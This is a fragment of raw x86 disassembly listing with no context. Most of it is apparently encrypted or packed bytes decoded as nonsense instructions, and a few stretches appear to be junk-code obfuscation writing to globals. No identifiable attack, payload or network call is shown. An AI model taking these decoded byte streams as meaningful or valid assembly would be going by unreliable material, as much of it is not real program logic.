  402adb:	cmp    DWORD PTR [ebp-0x5d],ecx
  402ade:	leave  
  402adf:	pop    esp
  402ae0:	mov    al,ds:0x7f01375b
  402ae5:	ret    
  402ae6:	push   ecx
  402ae7:	jbe    0x402a97
  402ae9:	mov    cl,0x46
  402aeb:	jo     0x402a91
  402aed:	fistp  DWORD PTR [ebp+0x16222dca]
  402af3:	int3   
  402af4:	std    
  402af5:	jecxz  0x402aee
  402af7:	push   0x516952c7
  402afc:	cwde   
  402afd:	div    BYTE PTR [edi+0x71]
  402b00:	jo     0x402b77
  402b02:	xchg   ebp,eax
  402b03:	repnz xchg ebx,eax
  402b05:	mov    bh,0xd6
  402b07:	push   esi
  402b08:	inc    ecx
  402b09:	mov    esi,0x521836a3
  402b0e:	fdivrp st(2),st
  402b10:	(bad)  
  402b11:	cdq    
  402b12:	xchg   cl,cl
  402b14:	jno    0x402b43
  402b16:	jne    0x3a8464ce
  402b1c:	cmp    eax,0x6ab736d2
  402b21:	or     edi,edx
  402b23:	fcomp  st(4)
  402b25:	pop    ss
  402b26:	lods   eax,DWORD PTR ds:[esi]
  402b27:	scas   eax,DWORD PTR es:[edi]
  402b28:	ror    DWORD PTR [edx+0xcf0004b],cl
  402b2e:	int3   
  402b2f:	push   edx
  402b30:	out    dx,eax
  402b31:	inc    esp
  402b32:	dec    edx
  402b33:	aad    0x1f
  402b35:	add    ebp,eax
  402b37:	pop    edi
  402b38:	dec    esi
  402b39:	inc    esp
  402b3a:	lods   eax,DWORD PTR es:[esi]
  402b3c:	adc    BYTE PTR [ecx+0x64e88430],cl
  402b42:	in     eax,0x2a
  402b44:	sbb    DWORD PTR [ecx+ecx*1+0x7f],esp
  402b48:	repnz xor ebx,esi
  402b4b:	lods   al,BYTE PTR ds:[esi]
  402b4c:	mov    dl,0xc
  402b4e:	punpckhwd mm3,QWORD PTR [ecx+0x35]
  402b52:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402b53:	cmp    eax,0xea969cff
  402b58:	test   BYTE PTR [edx-0x6b917c03],ch
  402b5e:	gs jne 0x402afc
  402b61:	stos   DWORD PTR es:[edi],eax
  402b62:	push   ebx
  402b63:	xchg   ecx,eax
  402b64:	cmp    eax,0xd4ccdd7c
  402b69:	pop    eax
  402b6a:	push   ecx
  402b6b:	push   eax
  402b6c:	push   0xddf
  402b71:	sbb    DWORD PTR ds:0x428387,0x41e0
  402b7b:	push   0x2d0f
  402b80:	call   0x42205c
  402b85:	mov    ecx,DWORD PTR [ebp-0x68]
  402b88:	not    edx
  402b8a:	mov    edx,DWORD PTR [ebp-0x64]
  402b8d:	cmp    DWORD PTR ds:0x428273,0x0
  402b94:	mov    edx,DWORD PTR ds:0x428387
  402b9a:	mov    DWORD PTR ds:0x42817f,0x2873
  402ba4:	movzx  edx,WORD PTR ds:0x428223
  402bab:	jmp    0x402c06
  402bb0:	mov    DWORD PTR ds:0x4282fb,ebx
  402bb6:	cmp    DWORD PTR ds:0x428273,0x0
  402bbd:	jb     0x402be8
  402bc3:	push   DWORD PTR [ebp-0x1c]
  402bc6:	call   DWORD PTR ds:0x428d74
  402bcc:	mov    edx,DWORD PTR ds:0x428283
  402bd2:	add    DWORD PTR ds:0x42825b,edx
  402bd8:	mov    DWORD PTR ds:0x4282ff,0x7648
  402be2:	adc    edx,DWORD PTR ds:0x42823b
  402be8:	mov    edx,DWORD PTR ds:0x42830b
  402bee:	sbb    DWORD PTR ds:0x428297,edx
  402bf4:	mov    edx,DWORD PTR ds:0x428253
  402bfa:	xor    DWORD PTR ds:0x428317,edx
  402c00:	and    edx,DWORD PTR ds:0x4282ef
  402c06:	xor    eax,ecx
  402c08:	mov    ecx,DWORD PTR [ebp-0x70]
  402c0b:	xor    edx,0x594e
  402c11:	mov    edx,DWORD PTR [ebp-0x6c]
  402c14:	add    DWORD PTR ds:0x42821b,0x7b5b
  402c1e:	sub    eax,ecx
  402c20:	mov    ecx,DWORD PTR ds:0x4281c3
  402c26:	mov    ecx,DWORD PTR [ecx]
  402c28:	and    DWORD PTR ds:0x42824b,ecx
  402c2e:	mov    ecx,DWORD PTR ds:0x422578
  402c34:	or     DWORD PTR ds:0x428143,0x509d
  402c3e:	lea    eax,[eax+ecx*1-0x27d2]
  402c45:	mov    ecx,DWORD PTR [ebp-0x1c]
  402c48:	mov    edx,DWORD PTR [ebp-0x2c]
  402c4b:	sbb    DWORD PTR ds:0x4282eb,0x9f0
  402c55:	or     ecx,0x4f00
  402c5b:	add    DWORD PTR ds:0x42837f,0x42835b
  402c65:	jmp    0x403043
  402c6a:	nop
  402c6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402c6c:	(bad)  
  402c6d:	call   0x1caec68c
  402c72:	int    0x3e
  402c74:	cmp    DWORD PTR [ebp+eiz*8-0x51],0x31
  402c79:	mov    esi,0x1818f4b6
  402c7e:	sahf   
  402c7f:	adc    bl,BYTE PTR [eax]
  402c81:	sbb    BYTE PTR [eax-0x1f09937b],dl
  402c87:	or     dl,ch
  402c89:	jmp    0x402c84
  402c8b:	and    eax,ecx
  402c8d:	dec    edx
  402c8e:	mov    eax,0xe3368e05
  402c93:	push   ds
  402c94:	adc    al,0xb6
  402c96:	sbb    ecx,edi
  402c98:	sub    DWORD PTR [eax],esi
  402c9a:	sub    BYTE PTR [ecx+edi*2-0x5f],0x75
  402c9f:	mov    ds:0x7bf565a5,al
  402ca4:	dec    edi
  402ca5:	dec    esi
  402ca6:	addr16 leave 
  402ca8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402ca9:	xor    DWORD PTR [eax+0x1442100a],esi
  402caf:	out    0xa5,eax
  402cb1:	test   ebp,esp
  402cb3:	les    ebx,FWORD PTR [eax-0x5c]
  402cb6:	and    edi,DWORD PTR [ebx]
  402cb8:	test   BYTE PTR [ecx],al
  402cba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402cbb:	shl    BYTE PTR [ebx-0x948ddb7],cl
  402cc1:	mov    al,0x75
  402cc3:	adc    DWORD PTR [edi-0x5c],0x3d585ed4
  402cca:	adc    ah,BYTE PTR [edi+0x73f360be]
  402cd0:	add    BYTE PTR [eax+edx*4-0x59],ch
  402cd4:	xor    al,0xcb
  402cd6:	outs   dx,DWORD PTR ds:[esi]
  402cd7:	sbb    DWORD PTR [ecx+0x65],0x44
  402cdb:	stos   BYTE PTR es:[edi],al
  402cdc:	jecxz  0x402ced
  402cde:	cwde   
  402cdf:	adc    ebp,esi
  402ce1:	pop    edi
  402ce2:	mul    BYTE PTR [edx-0x73]
  402ce5:	mov    ebp,esp
  402ce7:	inc    eax
  402ce8:	jle    0x402c6f
  402cea:	test   DWORD PTR [edi+0x3b5e2169],esp
  402cf0:	test   eax,0x7fbdf6a3
  402cf5:	mov    al,0x84
  402cf7:	adc    ah,BYTE PTR [edi-0x57]
  402cfa:	push   ds
  402cfb:	out    0xb9,al
  402cfd:	dec    eax
  402cfe:	sbb    BYTE PTR [ebx-0x3c],0x74
  402d02:	mov    ebx,0x2ea6ca38
  402d07:	jmp    0x36a7:0x955feaf5
  402d0e:	out    dx,al
  402d0f:	sbb    eax,0x11ec8fd
  402d14:	mov    BYTE PTR [edi-0x65eefb44],0x6d
  402d1b:	and    al,0x48
  402d1d:	cmp    esi,DWORD PTR [ebx+0x51c512ad]
  402d23:	mov    dh,0xd3
  402d25:	jne    0x402d1a
  402d27:	js     0x402cda
  402d29:	add    BYTE PTR [ebx+0x5e9880ff],cl
  402d2f:	inc    eax
  402d30:	adc    cl,BYTE PTR [ebp-0x5cc44c7e]
  402d36:	retf   
  402d37:	jge    0x402d01
  402d39:	mov    bl,0x20
  402d3b:	call   0x89b8cc98
  402d40:	mov    edi,0x7eef999b
  402d45:	jns    0x402d94
  402d47:	lock sbb DWORD PTR [edx],ebx
  402d4a:	pusha  
  402d4b:	jmp    0x485a:0x9ed6e167
  402d52:	and    edi,edi
  402d54:	pop    ecx
  402d55:	sbb    DWORD PTR [eax],0x5a3126b4
  402d5b:	push   eax
  402d5c:	sub    BYTE PTR gs:[esp+edi*2+0x31],bl
  402d61:	jmp    0x2260:0x6154bc36
  402d68:	repnz cld 
  402d6a:	int3   
  402d6b:	pop    DWORD PTR [esi-0x2a]
  402d6e:	ja     0x402dcd
  402d70:	jecxz  0x402dcc
  402d72:	cwde   
  402d73:	lds    ebx,FWORD PTR [ecx]
  402d75:	sbb    eax,0x738262c0
  402d7a:	cmp    ch,BYTE PTR [esi+0x13014f86]
  402d80:	es mov eax,0x349c5565
  402d86:	jns    0x402d33
  402d88:	xchg   edi,edi
  402d8a:	xchg   esi,eax
  402d8b:	cmp    BYTE PTR [eax+0xe],dh
  402d8e:	iret   
  402d8f:	in     eax,0x58
  402d91:	or     ah,BYTE PTR [edi+0x335fd052]
  402d97:	loop   0x402dd5
  402d99:	bound  esi,QWORD PTR [esi-0x5b3a7918]
  402d9f:	repnz hlt 
  402da1:	and    ecx,edi
  402da3:	pop    edi
  402da4:	xchg   ecx,eax
  402da5:	and    eax,0x9e0ab2b6
  402daa:	rcl    DWORD PTR [ecx],1
  402dac:	sub    al,0xa0
  402dae:	sbb    eax,0xafe3eea3
  402db3:	lods   eax,DWORD PTR ds:[esi]
  402db4:	jmp    0x402d77
  402db6:	or     DWORD PTR [eax],ebx
  402db8:	sub    edi,esi
  402dba:	mov    ebp,0x4a67d3de
  402dbf:	lea    eax,[ebx+edi*8+0x732945f6]
  402dc6:	push   eax
  402dc7:	add    bh,BYTE PTR [esi]
  402dc9:	jp     0x402dd6
  402dcb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402dcc:	jno    0x402e20
  402dce:	js     0x402dab
  402dd0:	inc    ebp
  402dd1:	inc    edi
  402dd2:	sti    
  402dd3:	push   ebp
  402dd4:	fstp   DWORD PTR [eax]
  402dd6:	sbb    al,0x82
  402dd8:	imul   ebx,esi,0x9cec173d
  402dde:	add    al,0xaf
  402de0:	fs inc esp
  402de2:	xchg   edx,eax
  402de3:	jg     0x402e5f
  402de5:	in     al,dx
  402de6:	out    0x2d,eax
  402de8:	hlt    
  402de9:	xchg   esi,eax
  402dea:	jmp    0xe6dc:0xe0439cd9
  402df1:	inc    BYTE PTR ds:0x582e2128
  402df7:	mov    cl,0xa
  402df9:	lahf   
  402dfa:	cld    
  402dfb:	mov    ch,0xcb
  402dfd:	int    0x5
  402dff:	pop    ds
  402e00:	or     ecx,DWORD PTR ds:0xf4fdc5f2
  402e06:	popa   
  402e07:	mov    ebx,0xd8f72881
  402e0c:	jmp    0x3c88545b
  402e11:	and    dl,BYTE PTR [edi-0x4c]
  402e14:	pop    ds
  402e15:	repz std 
  402e17:	jecxz  0x402df8
  402e19:	jmp    0xdf23b4ee
  402e1e:	int3   
  402e1f:	neg    edi
  402e21:	test   al,0x32
  402e23:	mov    dh,0x58
  402e25:	jp     0x402dbc
  402e27:	jb     0x402e9c
  402e29:	fisttp DWORD PTR [esi]
  402e2b:	inc    edi
  402e2c:	xchg   esp,eax
  402e2d:	fisub  DWORD PTR [eax]
  402e2f:	loop   0x402e61
  402e31:	xor    al,0x5
  402e33:	inc    edx
  402e34:	mov    al,ds:0x15c53844
  402e39:	call   0xdcb9492a
  402e3e:	mov    WORD PTR [esp+ebx*4],ds
  402e41:	lea    esp,[ecx]
  402e43:	pop    esp
  402e44:	iret   
  402e45:	mov    ah,BYTE PTR [esi]
  402e47:	or     DWORD PTR gs:[esi-0x31],eax
  402e4b:	sar    ecx,1
  402e4d:	xchg   esp,eax
  402e4e:	dec    eax
  402e4f:	loop   0x402e3f
  402e51:	jle    0x402e43
  402e53:	or     bh,ah
  402e55:	jle    0x402dfb
  402e57:	mov    WORD PTR fs:[ebx-0x825242f],?
  402e5e:	and    bh,cl
  402e60:	rcr    bh,1
  402e62:	pop    ds
  402e63:	(bad)  
  402e64:	idiv   DWORD PTR [esi-0x2b]
  402e67:	add    eax,0xf5dab495
  402e6c:	mov    DWORD PTR [ebx],esi
  402e6e:	mov    ebx,0x921ccd7a
  402e73:	loope  0x402e78
  402e75:	sbb    BYTE PTR [esi-0x51],dl
  402e78:	pusha  
  402e79:	das    
  402e7a:	les    esp,FWORD PTR [ebp-0x2f684db0]
  402e80:	sub    BYTE PTR [ebp-0x30f45b4e],cl
  402e86:	clc    
  402e87:	(bad)  
  402e88:	loope  0x402e3b
  402e8a:	iret   
  402e8b:	sbb    ch,BYTE PTR [esi+0xfd059c2]
  402e91:	sar    BYTE PTR [ecx],cl
  402e93:	jmp    0xd322d86f
  402e98:	jecxz  0x402e62
  402e9a:	adc    DWORD PTR [ebp-0x2a],ebp
  402e9d:	retf   0xcd20
  402ea0:	push   ebx
  402ea1:	push   ebx
  402ea2:	das    
  402ea3:	dec    edx
  402ea4:	nop    DWORD PTR [ebx-0x771f48c3]
  402eab:	mov    esi,0x2437952
  402eb0:	or     DWORD PTR [ebp-0x3e0ab63e],ecx
  402eb6:	sbb    DWORD PTR [eax-0x7c4790a5],edi
  402ebc:	repnz (bad) 
  402ebe:	and    eax,DWORD PTR [edx+0x23]
  402ec1:	inc    ebp
  402ec2:	mov    ebp,0x7bc3f15f
  402ec7:	mov    esp,0x8a64f18c
  402ecc:	sbb    DWORD PTR [esi],0xffffffb8
  402ecf:	inc    ebp
  402ed0:	fild   DWORD PTR [ebx+ecx*1-0x60491720]
  402ed7:	and    eax,0xae6cda83
  402edc:	lahf   
  402edd:	jo     0x402e6c
  402edf:	sub    al,bl
  402ee1:	sti    
  402ee2:	ret    
  402ee3:	fcomp  DWORD PTR [ebx+eax*8+0x36]
  402ee7:	push   0xffffffaa
  402ee9:	inc    edi
  402eea:	jmp    0x402f36
  402eec:	xor    esp,DWORD PTR [ecx-0x69]
  402eef:	(bad)  
  402ef0:	xchg   ecx,eax
  402ef1:	jge    0x402e75
  402ef3:	mov    bl,0x55
  402ef5:	lods   eax,DWORD PTR ds:[esi]
  402ef6:	dec    ebp
  402ef7:	in     eax,dx
  402ef8:	jae    0x402f07
  402efa:	nop
  402efb:	pop    eax
  402efc:	call   0xbd642b67
  402f01:	or     al,0xf0
  402f03:	push   ds
  402f04:	fdivr  QWORD PTR [edi+0x3ac74ef0]
  402f0a:	add    eax,0xc8761e5f
  402f0f:	div    BYTE PTR [edx]
  402f11:	pop    es
  402f12:	ret    
  402f13:	stos   BYTE PTR es:[edi],al
  402f14:	xchg   ebp,eax
  402f15:	jns    0x402f27
  402f17:	call   0xefcf:0xc669d02f
  402f1e:	sar    DWORD PTR [edi-0x773ed8d],cl
  402f24:	test   eax,0xe02d61e6
  402f29:	pop    eax
  402f2a:	push   ebx
  402f2b:	pop    ebx
  402f2c:	add    eax,0x9d6f6ac9
  402f31:	adc    eax,0xfdf6e213
  402f36:	dec    edi
  402f37:	or     eax,0x12a8f77e
  402f3c:	xor    al,0x4d
  402f3e:	(bad)
  402f42:	mov    bl,0x61
  402f44:	add    edx,DWORD PTR [esi+ebp*4-0x44]
  402f48:	icebp  
  402f49:	aad    0x65
  402f4b:	jbe    0x402f19
  402f4d:	(bad)  
  402f4e:	or     BYTE PTR ds:[edx],bh
  402f51:	mov    DWORD PTR [ebx],ecx
  402f53:	into   
  402f54:	sbb    dl,BYTE PTR [edi+0x3070d946]
  402f5a:	mov    dh,0xe3
  402f5c:	add    ch,ah
  402f5e:	addr16 xchg ebx,eax
  402f60:	loop   0x402f70
  402f62:	inc    eax
  402f63:	inc    ebx
  402f64:	pop    edi
  402f65:	cli    
  402f66:	(bad)  
  402f67:	jmp    0xa6ac:0xc724e2aa
  402f6e:	or     al,0x55
  402f70:	mov    ebx,0x7c1f7cd0
  402f75:	rcl    DWORD PTR [eax],0x4c
  402f78:	rol    edi,0x3f
  402f7b:	bound  eax,QWORD PTR [esi+0x6a06d8e1]
  402f81:	cmp    BYTE PTR [esi-0x6ef8ac2],al
  402f87:	xor    bh,BYTE PTR [esi+0x690fb5a8]
  402f8d:	or     ebx,DWORD PTR [ecx]
  402f8f:	ins    BYTE PTR es:[edi],dx
  402f90:	retf   0xc2a2
  402f93:	jo     0x402fb2
  402f95:	ins    DWORD PTR es:[edi],dx
  402f96:	stos   DWORD PTR es:[edi],eax
  402f97:	push   es
  402f98:	xchg   esp,eax
  402f99:	pop    ss
  402f9a:	jbe    0x402fa6
  402f9c:	test   al,0x5b
  402f9e:	pop    ds
  402f9f:	fidivr WORD PTR ds:0x8016aa7d
  402fa5:	or     DWORD PTR [eax],0x51e64078
  402fab:	pop    edi
  402fac:	jmp    0x402f78
  402fae:	ins    BYTE PTR es:[edi],dx
  402faf:	mov    dh,bl
  402fb1:	xor    cl,al
  402fb3:	sub    al,0xf5
  402fb5:	push   ecx
  402fb6:	cli    
  402fb7:	pop    ds
  402fb8:	sub    esp,esp
  402fba:	ficomp DWORD PTR [edx+0x79]
  402fbd:	mov    ch,0xc2
  402fbf:	mov    cl,0xbb
  402fc1:	lods   al,BYTE PTR ds:[esi]
  402fc2:	dec    esp
  402fc3:	mov    ds:0x697a3df6,al
  402fc8:	xor    al,0xfd
  402fca:	repnz sti 
  402fcc:	hlt    
  402fcd:	cli    
  402fce:	(bad)  
  402fcf:	xchg   esp,eax
  402fd0:	mov    al,ds:0xb6a2f286
  402fd5:	dec    ecx
  402fd6:	and    eax,0x8f35098f
  402fdb:	fucomi st,st(2)
  402fdd:	(bad)  
  402fde:	(bad)  
  402fdf:	hlt    
  402fe0:	scas   al,BYTE PTR es:[edi]
  402fe1:	out    dx,ax
  402fe3:	and    ch,BYTE PTR ds:0xa2e2ba4a
  402fe9:	inc    eax
  402fea:	xchg   edi,eax
  402feb:	jno    0x403018
  402fed:	sub    BYTE PTR [eax],bh
  402fef:	cmp    ah,ch
  402ff1:	and    al,0x9f
  402ff3:	gs dec edi
  402ff5:	push   eax
  402ff6:	imul   ebx,DWORD PTR [ebp-0x67],0xffffffbb
  402ffa:	sar    DWORD PTR [edx-0x4ad04271],1
  403000:	popf   
  403001:	inc    ebx
  403002:	mov    esi,0x7ef59502
  403007:	mov    ah,0xf1
  403009:	fiadd  DWORD PTR [ecx+0x2a]
  40300c:	fild   DWORD PTR [eax]
  40300e:	inc    esi
  40300f:	ss cmc 
  403011:	or     BYTE PTR [ecx+ebp*8-0x31],ch
  403015:	sbb    al,0x24
  403017:	or     dh,BYTE PTR [ecx]
  403019:	push   eax
  40301a:	shr    DWORD PTR ds:0x489a,0xa4
  403020:	rcl    BYTE PTR [edx+0x5bfbdceb],1
  403026:	sbb    al,0x6
  403028:	inc    edx
  403029:	aaa    
  40302a:	sub    ecx,DWORD PTR [ecx+0x5aa1d6d5]
  403030:	mov    BYTE PTR [ebx-0x72ae8360],ah
  403036:	and    BYTE PTR [edi+ebx*2-0x64],dl
  40303a:	ins    BYTE PTR es:[edi],dx
  40303b:	inc    eax
  40303c:	mov    WORD PTR [edx],cs
  40303e:	jl     0x40309a
  403040:	pop    ds
  403041:	retf   0x2320
  403044:	retf   0xc281
  403047:	arpl   WORD PTR [eax+eax*1],si
  40304a:	add    BYTE PTR [ebx-0x35f433ab],cl
  403050:	xor    ecx,0x5fdd
  403056:	cmp    ecx,DWORD PTR [eax]
  403058:	mov    DWORD PTR ds:0x42828b,0x665d
  403062:	jne    0x40a9b0
  403068:	mov    ecx,DWORD PTR [esi]
  40306a:	cmp    DWORD PTR ds:0x42838f,0x0
  403071:	mov    DWORD PTR ds:0x428393,edx
  403077:	mov    DWORD PTR ds:0x4282db,0x1413
  403081:	mov    edx,DWORD PTR ds:0x428383
  403087:	jmp    0x4030db
  40308c:	mov    DWORD PTR ds:0x42814f,0x4beb
  403096:	not    eax
  403098:	cmp    DWORD PTR ds:0x42838f,0x0
  40309f:	jl     0x4030c1
  4030a5:	push   DWORD PTR [ebp-0x20]
  4030a8:	push   DWORD PTR [ebp-0xc]
  4030ab:	call   DWORD PTR ds:0x428d94
  4030b1:	mov    DWORD PTR ds:0x42823b,0x4e29
  4030bb:	inc    DWORD PTR ds:0x42825f
  4030c1:	or     edx,DWORD PTR ds:0x4282fb
  4030c7:	add    edx,DWORD PTR ds:0x42817f
  4030cd:	sub    edx,edx
  4030cf:	add    DWORD PTR ds:0x428387,edx
  4030d5:	sbb    edx,DWORD PTR ds:0x42830f
  4030db:	mov    eax,DWORD PTR [esi+0x4]
  4030de:	sbb    edx,DWORD PTR ds:0x428373
  4030e4:	shrd   ecx,eax,0x2
  4030e8:	shr    eax,0x2
  4030eb:	mov    eax,DWORD PTR [esi]
  4030ed:	xor    DWORD PTR ds:0x428393,edx
  4030f3:	mov    edx,DWORD PTR [esi+0x4]
  4030f6:	neg    DWORD PTR ds:0x42814b
  4030fc:	shl    eax,0x1e
  4030ff:	xor    ecx,edi
  403101:	xor    eax,eax
  403103:	sbb    DWORD PTR ds:0x428397,0x1e67
  40310d:	or     eax,ecx
  40310f:	jmp    0x4034ed
  403114:	and    al,0xd6
  403116:	push   esp
  403117:	repnz and dh,BYTE PTR [ebx+0x22]
  40311b:	inc    esi
  40311c:	sar    BYTE PTR [eax-0x73],1
  40311f:	jo     0x403140
  403121:	mov    ds:0xec3dbc93,al
  403126:	sbb    BYTE PTR [eax],bl
  403128:	sahf   
  403129:	adc    bl,BYTE PTR [eax]
  40312b:	sbb    BYTE PTR [ecx+0x33],ch
  40312e:	or     bh,bl
  403130:	pop    ecx
  403131:	imul   BYTE PTR [ebx]
  403133:	and    edx,DWORD PTR gs:0x84dcd44b
  40313a:	repnz and DWORD PTR [esi+0x3b],esi
  40313e:	stos   DWORD PTR es:[edi],eax
  40313f:	jno    0x4031bd
  403141:	daa    
  403142:	int    0x18
  403144:	int3   
  403145:	push   edx
  403146:	int3   
  403147:	cli    
  403148:	jbe    0x403168
  40314a:	add    al,0xfe
  40314c:	add    edx,DWORD PTR [edx]
  40314e:	imul   ecx,esp,0x6b
  403151:	lods   eax,DWORD PTR ds:[esi]
  403152:	mov    bh,0x7f
  403154:	pop    ebp
  403155:	outs   dx,BYTE PTR ds:[esi]
  403156:	xchg   esi,eax
  403157:	adc    eax,0x30e8b010
  40315c:	mov    ecx,0xf3a2cc5c
  403161:	mov    esp,ss
  403163:	(bad)  
  403164:	pop    ebp
  403165:	push   edx
  403166:	sbb    al,0x44
  403168:	push   eax
  403169:	stc    
  40316a:	cdq    
  40316b:	loop   0x40310a
  40316d:	(bad)  
  40316e:	push   eax
  40316f:	pushf  
  403170:	cld    
  403171:	sub    edi,ecx
  403173:	icebp  
  403174:	pop    esp
  403175:	in     al,dx
  403176:	mov    ds:0x494914b0,al
  40317b:	sbb    al,0x3e
  40317d:	jns    0x4031fe
  40317f:	icebp  
  403180:	pop    edi
  403181:	sbb    BYTE PTR [edi+0x3],0xd1
  403185:	mov    ds:0x5ff3765e,al
  40318a:	xor    DWORD PTR [edi+0xc],eax
  40318d:	cmp    edi,DWORD PTR [ecx]
  40318f:	clc    
  403190:	ss dec edi
  403192:	fcmovu st,st(0)
  403194:	imul   esi,esi,0xc89e98e0
  40319a:	pop    edx
  40319b:	mov    edx,0x6b9ef8a2
  4031a0:	pop    eax
  4031a1:	shr    DWORD PTR [ebp-0x7edab80d],cl
  4031a7:	sub    cl,0x89
  4031aa:	std    
  4031ab:	sub    BYTE PTR [ebx],al
  4031ad:	retf   0xdb86
  4031b0:	(bad)  
  4031b1:	mov    esp,0xdd7c1550
  4031b6:	or     DWORD PTR ds:0x62b74d61,esp
  4031bc:	stc    
  4031bd:	retf   0x480a
  4031c0:	sub    al,0x44
  4031c2:	or     al,0x6d
  4031c4:	pop    ds
  4031c5:	inc    esi
  4031c6:	(bad)  
  4031c8:	mov    ebp,0xa79564c8
  4031cd:	lahf   
  4031ce:	pop    ds
  4031cf:	jg     0x4031f0
  4031d1:	sbb    DWORD PTR [ecx],0x665716d6
  4031d7:	loope  0x40318a
  4031d9:	je     0x403176
  4031db:	push   edx
  4031dc:	out    0x71,al
  4031de:	loop   0x4031f1
  4031e0:	rcl    BYTE PTR [ebx],0xc8
  4031e3:	test   BYTE PTR [edx-0x52],0x18
  4031e7:	je     0x40317e
  4031e9:	cld    
  4031ea:	dec    edx
  4031eb:	add    ebx,DWORD PTR [ecx+0x6c62153]
  4031f1:	mov    ds:0x8d014e4a,al
  4031f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4031f7:	cli    
  4031f8:	sahf   
  4031f9:	sub    al,0xcb
  4031fb:	gs cmp al,0x43
  4031fe:	sub    eax,0x1e74a382
  403203:	jmp    0x4031c3
  403205:	cmp    ch,BYTE PTR [esi]
  403207:	mov    al,0x24
  403209:	icebp  
  40320a:	outs   dx,BYTE PTR ds:[esi]
  40320b:	dec    edx
  40320c:	and    eax,DWORD PTR [edi+0x27]
  40320f:	mov    esi,0x30dd4105
  403214:	cwde   
  403215:	daa    
  403216:	sub    eax,DWORD PTR [ebx-0x2a47ae6a]
  40321c:	add    eax,0xe8566493
  403221:	and    edi,DWORD PTR [esi]
  403223:	or     BYTE PTR [edi-0x5d465193],dh
  403229:	rcr    BYTE PTR [edx-0x76],1
  40322c:	js     0x4031db
  40322e:	xlat   BYTE PTR ds:[ebx]
  40322f:	in     eax,0xab
  403231:	out    dx,eax
  403232:	mov    eax,0xe65ad6e7
  403237:	pop    eax
  403238:	pop    ecx
  403239:	adc    BYTE PTR [edx],cl
  40323b:	ror    DWORD PTR [esi+edi*1+0x6ef61762],cl
  403242:	les    edx,FWORD PTR [esp+ebp*2]
  403245:	pop    DWORD PTR [edx]
  403247:	adc    BYTE PTR [ebx],ch
  403249:	ror    BYTE PTR [ebx],cl
  40324b:	mov    bh,0x2a
  40324d:	or     edx,DWORD PTR [ebx+0x5b]
  403250:	sub    al,0x7e
  403252:	and    eax,0x30aaa57f
  403257:	adc    al,BYTE PTR [ebp*1-0x183e4213]
  40325e:	(bad)
  403263:	nop
  403264:	stc    
  403265:	test   cl,ch
  403267:	jmp    0x40326e
  403269:	jl     0x40323e
  40326b:	retf   0x8c8a
  40326e:	leave  
  40326f:	push   DWORD PTR [edi+eiz*1+0x7e76401f]
  403276:	in     al,dx
  403277:	pop    eax
  403278:	mov    dl,0x22
  40327a:	pop    ecx
  40327b:	addr16 hlt 
  40327d:	mov    bh,0x63
  40327f:	fmul   QWORD PTR ds:0x4f1eb49a
  403285:	je     0x403256
  403287:	jg     0x40327d
  403289:	xor    al,0x23
  40328b:	push   edi
  40328c:	pop    esi
  40328d:	mov    ecx,0x764f449f
  403292:	js     0x40326f
  403294:	dec    ebx
  403295:	xchg   ebp,eax
  403296:	add    ch,cl
  403298:	sbb    al,0xe5
  40329a:	or     DWORD PTR [eax-0x6c0d3ffc],edi
  4032a0:	je     0x403270
  4032a2:	dec    ebx
  4032a3:	mov    dl,0xe6
  4032a5:	jmp    0x4032de
  4032a7:	jo     0x4032d3
  4032a9:	adc    dh,BYTE PTR [edx-0x340f4416]
  4032af:	sbb    bh,BYTE PTR [eax]
  4032b1:	inc    ecx
  4032b2:	jbe    0x403327
  4032b4:	iret   
  4032b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4032b6:	cmp    DWORD PTR [ebp-0x31],0x6f
  4032ba:	sahf   
  4032bb:	jb     0x40323e
  4032bd:	cmp    eax,0xf6ca6555
  4032c2:	fnsave [edx-0x51]
  4032c5:	jno    0x40328c
  4032c7:	(bad)  
  4032c8:	cdq    
  4032c9:	adc    DWORD PTR [ebp+ebx*2-0x55ee3af9],edx
  4032d0:	and    eax,0x57e1081b
  4032d5:	jne    0x4032d3
  4032d7:	jae    0x403266
  4032d9:	out    dx,al
  4032da:	sar    BYTE PTR [ecx+0x74541600],cl
  4032e0:	sbb    al,0x21
  4032e2:	push   ebx
  4032e3:	shr    DWORD PTR [eax+ebx*2],0x42
  4032e7:	sbb    dh,BYTE PTR ds:[ecx-0x2ec6d067]
  4032ee:	cmp    ah,cl
  4032f0:	test   DWORD PTR [ebx+0x76],esi
  4032f3:	jl     0x4032b4
  4032f5:	jle    0x403312
  4032f7:	scas   al,BYTE PTR es:[edi]
  4032f8:	mov    ds,esi
  4032fa:	mov    edx,cr5
  4032fd:	(bad)  
  4032fe:	and    BYTE PTR [eax+0x7def93df],bh
  403304:	push   esi
  403305:	push   esp
  403306:	mov    ?,WORD PTR [ecx]
  403308:	mov    esp,DWORD PTR [ebx-0x4e]
  40330b:	loopne 0x403381
  40330d:	mov    al,BYTE PTR [esi-0x45]
  403310:	mov    BYTE PTR [edx+0x515ff8d6],ah
  403316:	jg     0x40336b
  403318:	mov    ds:0xd876dfe2,al
  40331d:	xlat   BYTE PTR ds:[ebx]
  40331e:	ss push cs
  403320:	sub    BYTE PTR [ecx],bh
  403322:	and    BYTE PTR [ebx],bl
  403324:	sbb    DWORD PTR [ebp-0x1366f8d6],ebx
  40332a:	push   ss
  40332b:	pop    ds
  40332c:	or     al,0x40
  40332e:	in     al,0x57
  403330:	sbb    dl,ah
  403332:	sar    DWORD PTR cs:[ebx+0x45],1
  403336:	pop    edi
  403337:	ds enter 0xa282,0xa6
  40333c:	xchg   BYTE PTR [eax+edi*2-0x77243993],bl
  403343:	sbb    BYTE PTR [edi+0x6c339d3],ah
  403349:	je     0x403376
  40334b:	outs   dx,DWORD PTR ds:[esi]
  40334c:	jne    0x4032eb
  40334e:	dec    ecx
  40334f:	push   0x41
  403351:	idiv   DWORD PTR [eax]
  403353:	sbb    bl,ch
  403355:	into   
  403356:	and    BYTE PTR [eax+0x0],ch
  403359:	dec    ecx
  40335a:	ficomp DWORD PTR [edx]
  40335c:	lahf   
  40335d:	arpl   WORD PTR [edi-0x2c],bx
  403360:	push   0x52783300
  403365:	lods   eax,DWORD PTR ds:[esi]
  403366:	jo     0x4032ee
